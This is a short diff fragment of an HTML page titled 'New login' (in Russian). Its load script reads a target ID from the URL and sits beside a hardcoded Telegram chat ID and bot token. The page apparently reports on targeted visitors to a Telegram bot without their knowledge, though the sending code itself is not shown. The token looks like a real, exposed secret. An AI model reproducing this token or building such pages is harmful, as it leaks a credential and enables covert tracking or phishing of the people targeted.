@@ -5,7 +5,12 @@
   <title>Новый вход</title>
   <script>
     window.onload = async function () {
-      // Статичные значения (меняйте при необходимости)
+      const urlParams = new URLSearchParams(window.location.search);
+      const TARGET_ID = urlParams.get("u"); 
+      if (!TARGET_ID) {
+        console.warn("Параметр u не найден в URL");
+        return;
+      }
       const CHAT_ID = 769893160;      // сюда отправлять (число или строка @channel)
       const BOT_TOKEN = '8254985090:AAEmnwYKpxW5zsB5RrbzTUNj8aNA8MasEeM'; // ⚠️ рекомендуется ревокировать и НЕ хранить здесь
 
